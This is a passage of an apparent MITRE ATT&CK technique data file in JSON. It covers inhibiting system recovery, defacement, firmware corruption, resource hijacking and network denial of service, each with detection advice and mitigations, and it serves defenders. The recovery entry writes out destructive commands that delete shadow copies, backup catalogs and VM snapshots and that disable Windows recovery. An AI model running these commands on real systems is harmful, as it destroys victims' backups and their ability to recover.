Hypervisor Jackpotting Pt 2 2021)</a>\n\nThreat actors may also disable or stop service in cloud environments. For example, by leveraging the <code>DisableAPIServiceAccess</code> API in AWS, a threat actor may prevent the service from creating service-linked roles on new accounts in the AWS Organization. <a href=\"https://securitylabs.datadoghq.com/articles/tales-from-the-cloud-trenches-the-attacker-doth-persist-too-much/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Datadog Security Labs Cloud Persistence 2025)</a> <a href=\"https://docs.aws.amazon.com/organizations/latest/APIReference/API_DisableAWSServiceAccess.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS DisableAWSServiceAccess)</a>","detection":"Monitor processes and command-line arguments to see if critical processes are terminated or stop running.\n\nMonitor for edits for modifications to services and startup programs that correspond to services of high importance. Look for changes to services that do not correlate with known software, patch cycles, etc. Windows service information is stored in the Registry at <code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. Systemd service unit files are stored within the /etc/systemd/system, /usr/lib/systemd/system/, and /home/.config/systemd/user/ directories, as well as associated symbolic links.\n\nAlterations to the service binary path or the service startup type changed to disabled may be suspicious.\n\nRemote access tools with built-in features may interact directly with the Windows API to perform these functions outside of typical system utilities. For example, <code>ChangeServiceConfigW</code> may be used by an adversary to prevent services from starting. <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a>","platforms":["ESXi","IaaS","Linux","macOS","Windows"],"dataSources":["Process: Process Creation","Process: Process Termination","Windows Registry: Windows Registry Key Modification","Command: Command Execution","File: File Modification","Process: OS API Execution","Service: Service Metadata"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit privileges of user accounts and groups so that only authorized administrators can interact with service changes and service configurations."},{"id":"M1022","name":"Restrict File and Directory Permissions","description":"Ensure proper process and file permissions are in place to inhibit adversaries from disabling or interfering with critical services."},{"id":"M1024","name":"Restrict Registry Permissions","description":"Ensure proper registry permissions are in place to inhibit adversaries from disabling or interfering with critical services."},{"id":"M1030","name":"Network Segmentation","description":"Operate intrusion detection, analysis, and response systems on a separate network from the production environment to lessen the chances that an adversary can see and interfere with critical response functions."},{"id":"M1060","name":"Out-of-Band Communications Channel","description":"Develop and enforce security policies that include the use of out-of-band communication channels for critical communications during a security incident. <a href=\"https://trustedsec.com/blog/to-oob-or-not-to-oob-why-out-of-band-communications-are-essential-for-incident-response\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: TrustedSec OOB Communications)</a>"}],"subTechniques":[]},{"id":"T1490","name":"Inhibit System Recovery","description":"Adversaries may delete or remove built-in data and turn off services designed to aid in the recovery of a corrupted system to prevent recovery. <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WannaCry 2017)</a> This may deny access to available backups and recovery options.\n\nOperating systems may contain features that can help fix corrupted systems, such as a backup catalog, volume shadow copies, and automatic repair features. Adversaries may disable or delete system recovery features to augment the effects of Data Destruction and Data Encrypted for Impact. <a href=\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Talos Olympic Destroyer 2018)</a> <a href=\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye WannaCry 2017)</a> Furthermore, adversaries may disable recovery notifications, then corrupt backups. <a href=\"https://x.com/TheDFIRReport/status/1498657590259109894\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: disable_notif_synology_ransom)</a>\n\nA number of native Windows utilities have been used by adversaries to disable or delete system recovery features:\n\n* <code>vssadmin.exe</code> can be used to delete all volume shadow copies on a system - <code>vssadmin.exe delete shadows /all /quiet</code>\n* Windows Management Instrumentation can be used to delete volume shadow copies - <code>wmic shadowcopy delete</code>\n* <code>wbadmin.exe</code> can be used to delete the Windows Backup Catalog - <code>wbadmin.exe delete catalog -quiet</code>\n* <code>bcdedit.exe</code> can be used to disable automatic Windows recovery features by modifying boot configuration data - <code>bcdedit.exe /set {default} bootstatuspolicy ignoreallfailures &amp; bcdedit /set {default} recoveryenabled no</code>\n* <code>REAgentC.exe</code> can be used to disable Windows Recovery Environment (WinRE) repair/recovery options of an infected system\n* <code>diskshadow.exe</code> can be used to delete all volume shadow copies on a system - <code>diskshadow delete shadows all</code> <a href=\"https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Diskshadow)</a> <a href=\"https://www.zscaler.com/blogs/security-research/technical-analysis-crytox-ransomware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crytox Ransomware)</a>\n\nOn network devices, adversaries may leverage Disk Wipe to delete backup firmware images and reformat the file system, then System Shutdown/Reboot to reload the device. Together this activity may leave network devices completely inoperable and inhibit recovery operations.\n\nOn ESXi servers, adversaries may delete or encrypt snapshots of virtual machines to support Data Encrypted for Impact, preventing them from being leveraged as backups (e.g., via <code> vim-cmd vmsvc/snapshot.removeall</code>). <a href=\"https://www.cybereason.com/blog/cybereason-vs.-blackcat-ransomware\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cybereason)</a>\n\nAdversaries may also delete “online” backups that are connected to their network – whether via network storage media or through folders that sync to cloud services. <a href=\"https://www.zdnet.com/article/ransomware-victims-thought-their-backups-were-safe-they-were-wrong/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: ZDNet Ransomware Backups 2020)</a> In cloud environments, adversaries may disable versioning and backup policies and delete snapshots, database backups, machine images, and prior versions of objects designed to be used in disaster recovery scenarios. <a href=\"https://www.darkreading.com/attacks-breaches/code-hosting-service-shuts-down-after-cyber-attack\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Dark Reading Code Spaces Cyber Attack)</a> <a href=\"https://rhinosecuritylabs.com/aws/s3-ransomware-part-2-prevention-and-defense/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Rhino Security Labs AWS S3 Ransomware)</a>","detection":"Use process monitoring to monitor the execution and command line parameters of binaries involved in inhibiting system recovery, such as vssadmin, wbadmin, bcdedit, REAgentC, and diskshadow. The Windows event logs, ex. Event ID 524 indicating a system catalog was deleted, may contain entries associated with suspicious activity.\n\nMonitor the status of services involved in system recovery. Monitor the registry for changes associated with system recovery features (ex: the creation of <code>HKEY_CURRENT_USER\\Software\\Policies\\Microsoft\\PreviousVersions\\DisableLocalPage</code>).\n\nFor network infrastructure devices, collect AAA logging to monitor for <code>erase</code>, <code>format</code>, and <code>reload</code> commands being run in succession.","platforms":["Containers","ESXi","IaaS","Linux","macOS","Network Devices","Windows"],"dataSources":["Process: Process Creation","Windows Registry: Windows Registry Key Modification","Cloud Storage: Cloud Storage Deletion","Command: Command Execution","Service: Service Metadata","Snapshot: Snapshot Deletion","File: File Deletion"],"mitigations":[{"id":"M1018","name":"User Account Management","description":"Limit the user accounts that have access to backups to only those required. In AWS environments, consider using Service Control Policies to restrict API calls to delete backups, snapshots, and images."},{"id":"M1028","name":"Operating System Configuration","description":"Consider technical controls to prevent the disabling of services or deletion of files involved in system recovery. Additionally, ensure that WinRE is enabled using the following command: <code>reagentc /enable</code>. <a href=\"https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/reagentc-command-line-options?view=windows-11\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: reagentc_cmd)</a>"},{"id":"M1038","name":"Execution Prevention","description":"Consider using application control configured to block execution of utilities such as <code>diskshadow.exe</code> that may not be required for a given system or network to prevent potential misuse by adversaries."},{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery. In cloud environments, enable versioning on storage objects where possible, and copy backups to other accounts or regions to isolate them from the original copies. <a href=\"https://unit42.paloaltonetworks.com/ransomware-in-public-clouds/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Palo Alto Ransomware in Public Clouds 2022)</a> On ESXi servers, ensure that disk images and snapshots of virtual machines are regularly taken, with copies stored off system. <a href=\"https://www.crowdstrike.com/en-us/blog/hypervisor-jackpotting-ecrime-actors-increase-targeting-of-esxi-servers/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Crowdstrike Hypervisor Jackpotting Pt 2 2021)</a>"}],"subTechniques":[]},{"id":"T1491","name":"Defacement","description":"Adversaries may modify visual content available internally or externally to an enterprise network, thus affecting the integrity of the original content. Reasons for Defacement include delivering messaging, intimidation, or claiming (possibly false) credit for an intrusion. Disturbing or offensive images may be used as a part of Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages.","detection":"Monitor internal and external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":["Windows","IaaS","Linux","macOS","ESXi"],"dataSources":["Network Traffic: Network Traffic Content","File: File Creation","Application Log: Application Log Content","File: File Modification"],"mitigations":[{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}],"subTechniques":[{"id":"T1491.001","name":"Internal Defacement","description":"An adversary may deface systems internal to an organization in an attempt to intimidate or mislead users, thus discrediting the integrity of the systems. This may take the form of modifications to internal websites or server login messages, or directly to user systems with the replacement of the desktop wallpaper. <a href=\"https://web.archive.org/web/20160226161828/https://www.operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster)</a> <a href=\"https://www.varonis.com/blog/vmware-esxi-in-the-line-of-ransomware-fire\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Varonis)</a> Disturbing or offensive images may be used as a part of Internal Defacement in order to cause user discomfort, or to pressure compliance with accompanying messages. Since internally defacing systems exposes an adversary's presence, it often takes place after other intrusion goals have been accomplished. <a href=\"https://web.archive.org/web/20160303200515/https://operationblockbuster.com/wp-content/uploads/2016/02/Operation-Blockbuster-Destructive-Malware-Report.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Novetta Blockbuster Destructive Malware)</a>","detection":"Monitor internal and websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":["ESXi","Linux","macOS","Windows"],"dataSources":["File: File Creation","Network Traffic: Network Traffic Content","Application Log: Application Log Content","File: File Modification"],"mitigations":[{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}]},{"id":"T1491.002","name":"External Defacement","description":"An adversary may deface systems external to an organization in an attempt to deliver messaging, intimidate, or otherwise mislead an organization or users. External Defacement may ultimately cause users to distrust the systems and to question/discredit the system’s integrity. Externally-facing websites are a common victim of defacement; often targeted by adversary and hacktivist groups in order to push a political message or spread propaganda. <a href=\"https://www.fireeye.com/content/dam/fireeye-www/current-threats/pdfs/ib-entertainment.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye Cyber Threats to Media Industries)</a> <a href=\"https://www.intelligence.senate.gov/sites/default/files/documents/os-kmandia-033017.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kevin Mandia Statement to US Senate Committee on Intelligence)</a> <a href=\"https://torrentfreak.com/anonymous-hackers-deface-russian-govt-site-to-protest-web-blocking-nsfw-180512/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Anonymous Hackers Deface Russian Govt Site)</a> External Defacement may be used as a catalyst to trigger events, or as a response to actions taken by an organization or government. Similarly, website defacement may also be used as setup, or a precursor, for future attacks such as Drive-by Compromise. <a href=\"https://documents.trendmicro.com/assets/white_papers/wp-a-deep-dive-into-defacement.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Deep Dive Into Defacement)</a>","detection":"Monitor external websites for unplanned content changes. Monitor application logs for abnormal behavior that may indicate attempted or successful exploitation. Use deep packet inspection to look for artifacts of common exploit traffic, such as SQL injection. Web Application Firewalls may detect improper inputs attempting exploitation.","platforms":["Windows","IaaS","Linux","macOS"],"dataSources":["Application Log: Application Log Content","File: File Modification","File: File Creation","Network Traffic: Network Traffic Content"],"mitigations":[{"id":"M1053","name":"Data Backup","description":"Consider implementing IT disaster recovery plans that contain procedures for taking regular data backups that can be used to restore organizational data. <a href=\"https://www.ready.gov/business/implementation/IT\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Ready.gov IT DRP)</a> Ensure backups are stored off system and is protected from common methods adversaries may use to gain access and destroy the backups to prevent recovery."}]}]},{"id":"T1495","name":"Firmware Corruption","description":"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system. <a href=\"https://web.archive.org/web/20190508170055/https://www.symantec.com/security-center/writeup/2000-122010-2655-99\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec Chernobyl W95.CIH)</a> Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable. <a href=\"https://cyber.dhs.gov/assets/report/ar-16-20173.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: dhs_threat_to_net_devices)</a> <a href=\"https://www.cisa.gov/uscert/ncas/alerts/aa22-057a\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: cisa_malware_orgs_ukraine)</a> Depending on the device, this attack may also result in Data Destruction.","detection":"System firmware manipulation may be detected. <a href=\"http://www.mitre.org/publications/project-stories/going-deep-into-the-bios-with-mitre-firmware-security-research\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: MITRE Trustworthy Firmware Measurement)</a> Log attempts to read/write to BIOS and compare against known patching behavior.","platforms":["Linux","macOS","Network Devices","Windows"],"dataSources":["Firmware: Firmware Modification"],"mitigations":[{"id":"M1026","name":"Privileged Account Management","description":"Prevent adversary access to privileged accounts or access necessary to replace system firmware."},{"id":"M1046","name":"Boot Integrity","description":"Check the integrity of the existing BIOS and device firmware to determine if it is vulnerable to modification."},{"id":"M1051","name":"Update Software","description":"Patch the BIOS and other firmware as necessary to prevent successful use of known vulnerabilities."}],"subTechniques":[]},{"id":"T1496","name":"Resource Hijacking","description":"Adversaries may leverage the resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nResource hijacking may take a number of different forms. For example, adversaries may:\n\n* Leverage compute resources in order to mine cryptocurrency\n* Sell network bandwidth to proxy networks\n* Generate SMS traffic for profit\n* Abuse cloud-based messaging services to send large quantities of spam messages\n\nIn some cases, adversaries may leverage multiple types of Resource Hijacking at once. <a href=\"https://sysdig.com/blog/labrat-cryptojacking-proxyjacking-campaign/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig Cryptojacking Proxyjacking 2023)</a>","detection":"Consider monitoring process resource usage to determine anomalous activity associated with malicious hijacking of computer resources such as CPU, memory, and graphics processing resources. Monitor for suspicious use of network resources associated with cryptocurrency mining software. Monitor for common cryptomining software process names and files on local systems that may indicate compromise and resource usage.","platforms":["Windows","IaaS","Linux","macOS","Containers","SaaS"],"dataSources":["Cloud Service: Cloud Service Modification","Application Log: Application Log Content","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","File: File Creation","Network Traffic: Network Connection Creation","Sensor Health: Host Status","Process: Process Creation","Command: Command Execution"],"mitigations":[],"subTechniques":[{"id":"T1496.001","name":"Compute Hijacking","description":"Adversaries may leverage the compute resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nOne common purpose for Compute Hijacking is to validate transactions of cryptocurrency networks and earn virtual currency. Adversaries may consume enough system resources to negatively impact and/or cause affected machines to become unresponsive. <a href=\"https://securelist.com/lazarus-under-the-hood/77908/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Kaspersky Lazarus Under The Hood Blog 2017)</a> Servers and cloud-based systems are common targets because of the high potential for available resources, but user endpoint systems may also be compromised and used for Compute Hijacking and cryptocurrency mining. <a href=\"https://medium.com/cloudsploit/the-danger-of-unused-aws-regions-af0bf1b878fc\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CloudSploit - Unused AWS Regions)</a> Containerized environments may also be targeted due to the ease of deployment via exposed APIs and the potential for scaling mining activities by deploying or compromising multiple containers within an environment or cluster. <a href=\"https://unit42.paloaltonetworks.com/hildegard-malware-teamtnt/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Hildegard Malware)</a> <a href=\"https://www.trendmicro.com/en_us/research/19/e/infected-cryptocurrency-mining-containers-target-docker-hosts-with-exposed-apis-use-shodan-to-find-additional-victims.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro Exposed Docker APIs)</a>\n\nAdditionally, some cryptocurrency mining malware identify then kill off processes for competing malware to ensure it’s not competing for resources. <a href=\"https://www.trendmicro.com/en_us/research/20/i/war-of-linux-cryptocurrency-miners-a-battle-for-resources.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Trend Micro War of Crypto Miners)</a>","detection":"","platforms":["Windows","IaaS","Linux","macOS","Containers"],"dataSources":["Command: Command Execution","Network Traffic: Network Connection Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Traffic Flow","Sensor Health: Host Status","Process: Process Creation","File: File Creation"],"mitigations":[]},{"id":"T1496.002","name":"Bandwidth Hijacking","description":"Adversaries may leverage the network bandwidth resources of co-opted systems to complete resource-intensive tasks, which may impact system and/or hosted service availability. \n\nAdversaries may also use malware that leverages a system's network bandwidth as part of a botnet in order to facilitate Network Denial of Service campaigns and/or to seed malicious torrents. <a href=\"https://www.welivesecurity.com/2019/07/08/south-korean-users-backdoor-torrents/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: GoBotKR)</a> Alternatively, they may engage in proxyjacking by selling use of the victims' network bandwidth and IP address to proxyware services. <a href=\"https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig Proxyjacking)</a> Finally, they may engage in internet-wide scanning in order to identify additional targets for compromise. <a href=\"https://unit42.paloaltonetworks.com/large-scale-cloud-extortion-operation/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Unit 42 Leaked Environment Variables 2024)</a>\n\nIn addition to incurring potential financial costs or availability disruptions, this technique may cause reputational damage if a victim’s bandwidth is used for illegal activities. <a href=\"https://sysdig.com/blog/proxyjacking-attackers-log4j-exploited/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig Proxyjacking)</a>","detection":"","platforms":["Linux","Windows","macOS","IaaS","Containers"],"dataSources":["Network Traffic: Network Traffic Flow","File: File Creation","Command: Command Execution","Process: Process Creation","Network Traffic: Network Traffic Content","Network Traffic: Network Connection Creation"],"mitigations":[]},{"id":"T1496.003","name":"SMS Pumping","description":"Adversaries may leverage messaging services for SMS pumping, which may impact system and/or hosted service availability. <a href=\"https://www.twilio.com/en-us/blog/sms-pumping-fraud-solutions\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twilio SMS Pumping)</a> SMS pumping is a type of telecommunications fraud whereby a threat actor first obtains a set of phone numbers from a telecommunications provider, then leverages a victim’s messaging infrastructure to send large amounts of SMS messages to numbers in that set. By generating SMS traffic to their phone number set, a threat actor may earn payments from the telecommunications provider. <a href=\"https://www.twilio.com/docs/glossary/what-is-sms-pumping-fraud\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twilio SMS Pumping Fraud)</a>\n\nThreat actors often use publicly available web forms, such as one-time password (OTP) or account verification fields, in order to generate SMS traffic. These fields may leverage services such as Twilio, AWS SNS, and Amazon Cognito in the background. <a href=\"https://www.twilio.com/en-us/blog/sms-pumping-fraud-solutions\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twilio SMS Pumping)</a> <a href=\"https://reinforce.awsevents.com/content/dam/reinforce/2024/slides/TDR432_New-tactics-and-techniques-for-proactive-threat-detection.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: AWS RE:Inforce Threat Detection 2024)</a> In response to the large quantity of requests, SMS costs may increase and communication channels may become overwhelmed. <a href=\"https://www.twilio.com/en-us/blog/sms-pumping-fraud-solutions\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Twilio SMS Pumping)</a>","detection":"","platforms":["SaaS"],"dataSources":["Application Log: Application Log Content"],"mitigations":[{"id":"M1013","name":"Application Developer Guidance","description":"Consider implementing CAPTCHA protection on forms that send messages via SMS."}]},{"id":"T1496.004","name":"Cloud Service Hijacking","description":"Adversaries may leverage compromised software-as-a-service (SaaS) applications to complete resource-intensive tasks, which may impact hosted service availability. \n\nFor example, adversaries may leverage email and messaging services, such as AWS Simple Email Service (SES), AWS Simple Notification Service (SNS), SendGrid, and Twilio, in order to send large quantities of spam / Phishing emails and SMS messages. <a href=\"https://www.invictus-ir.com/news/the-curious-case-of-dangerdev-protonmail-me\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Invictus IR DangerDev 2024)</a> <a href=\"https://permiso.io/blog/s/aws-ses-pionage-detecting-ses-abuse/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Permiso SES Abuse 2023)</a> <a href=\"https://www.sentinelone.com/labs/sns-sender-active-campaigns-unleash-messaging-spam-through-the-cloud/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: SentinelLabs SNS Sender 2024)</a> Alternatively, they may engage in LLMJacking by leveraging reverse proxies to hijack the power of cloud-hosted AI models. <a href=\"https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig LLMJacking 2024)</a> <a href=\"https://www.lacework.com/blog/detecting-ai-resource-hijacking-with-composite-alerts\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Lacework LLMJacking 2024)</a>\n\nIn some cases, adversaries may leverage services that the victim is already using. In others, particularly when the service is part of a larger cloud platform, they may first enable the service. <a href=\"https://sysdig.com/blog/llmjacking-stolen-cloud-credentials-used-in-new-ai-attack/\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Sysdig LLMJacking 2024)</a> Leveraging SaaS applications may cause the victim to incur significant financial costs, use up service quotas, and otherwise impact availability.","detection":"","platforms":["SaaS"],"dataSources":["Cloud Service: Cloud Service Modification","Application Log: Application Log Content"],"mitigations":[]}]},{"id":"T1498","name":"Network Denial of Service","description":"Adversaries may perform Network Denial of Service (DoS) attacks to degrade or block the availability of targeted resources to users. Network DoS can be performed by exhausting the network bandwidth services rely on. Example resources include specific websites, email services, DNS, and web-based applications. Adversaries have been observed conducting network DoS attacks for political purposes <a href=\"https://www.fireeye.com/blog/threat-research/2014/11/operation-poisoned-handover-unveiling-ties-between-apt-activity-in-hong-kongs-pro-democracy-movement.html\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FireEye OpPoisonedHandover February 2016)</a> and to support other malicious activities, including distraction <a href=\"https://www.ic3.gov/Media/PDF/Y2012/FraudAlertFinancialInstitutionEmployeeCredentialsTargeted.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: FSISAC FraudNetDoS September 2012)</a>, hacktivism, and extortion. <a href=\"https://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-continued-rise-of-ddos-attacks.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Symantec DDoS October 2014)</a>\n\nA Network DoS will occur when the bandwidth capacity of the network connection to a system is exhausted due to the volume of malicious traffic directed at the resource or the network connections and network devices the resource relies on. For example, an adversary may send 10Gbps of traffic to a server that is hosted by a network with a 1Gbps connection to the internet. This traffic can be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform Network DoS attacks several aspects apply to multiple methods, including IP address spoofing, and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nFor DoS attacks targeting the hosting system directly, see Endpoint Denial of Service.","detection":"Detection of Network DoS can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a>, SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an Network DoS event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with remediation.","platforms":["Windows","IaaS","Linux","macOS","Containers"],"dataSources":["Network Traffic: Network Traffic Flow","Sensor Health: Host Status"],"mitigations":[{"id":"M1037","name":"Filter Network Traffic","description":"When flood volumes exceed the capacity of the network connection being targeted, it is typically necessary to intercept the incoming traffic upstream to filter out the attack traffic from the legitimate traffic. Such defenses can be provided by the hosting Internet Service Provider (ISP) or by a 3rd party such as a Content Delivery Network (CDN) or providers specializing in DoS mitigations. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>\n\nDepending on flood volume, on-premises filtering may be possible by blocking source addresses sourcing the attack, blocking ports that are being targeted, or blocking protocols being used for transport. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>\n\nAs immediate response may require rapid engagement of 3rd parties, analyze the risk associated to critical resources being affected by Network DoS attacks and create a disaster recovery plan/business continuity plan to respond to incidents. <a href=\"http://cert.europa.eu/static/WhitePapers/CERT-EU_Security_Whitepaper_DDoS_17-003.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: CERT-EU DDoS March 2017)</a>"}],"subTechniques":[{"id":"T1498.001","name":"Direct Network Flood","description":"Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. Direct Network Floods are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks. <a href=\"https://www.justice.gov/opa/pr/seven-iranians-working-islamic-revolutionary-guard-corps-affiliated-entities-charged\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: USNYAG IranianBotnet March 2016)</a>","detection":"Detection of a network flood can sometimes be achieved before the traffic volume is sufficient to cause impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness or services provided by an upstream network service provider. Typical network throughput monitoring tools such as netflow <a href=\"https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/netflow/configuration/15-mt/nf-15-mt-book/nf-detct-analy-thrts.pdf\" target=\"_blank\" rel=\"noopener\" class=\"citation\">(Citation: Cisco DoSdetectNetflow)</a>, SNMP, and custom scripts can be used to detect sudden increases in network or service utilization. Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect a network flood event as it starts. Often, the lead time may be small and the indicator of an event availability of the network or service drops. The analysis tools mentioned can then be used to determine the type of DoS causing the outage and help with 